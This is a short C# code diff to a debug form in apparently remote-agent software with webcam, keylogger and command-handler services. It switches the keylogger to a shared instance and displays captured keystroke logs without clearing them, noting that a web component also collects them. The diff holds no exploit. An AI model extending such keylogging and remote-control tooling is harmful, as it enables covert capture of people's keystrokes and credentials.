@@ -50,7 +50,7 @@ public class AgentDebugForm : Form
         _configuration = configuration;
         _commandHandler = new CommandHandler();
         _webCamService = new WebCamService();
-        _keyLoggerService = new KeyLoggerService();
+        _keyLoggerService = KeyLoggerService.Instance;
 
         // ✅ NEW: init SystemInfoService
         _systemInfoService = new SystemInfoService();
@@ -440,8 +440,12 @@ public class AgentDebugForm : Form
         {
             try
             {
-                var logs = _keyLoggerService.GetLogs();
-                if (!string.IsNullOrEmpty(logs)) _txtKeyLogs.AppendText(logs);
+                // Use PeekLogText to display without clearing entries (Web uses GetLogs)
+                var text = _keyLoggerService.PeekLogText();
+                if (!string.IsNullOrEmpty(text))
+                {
+                    _txtKeyLogs.AppendText(text);
+                }
             }
             catch { }
         };
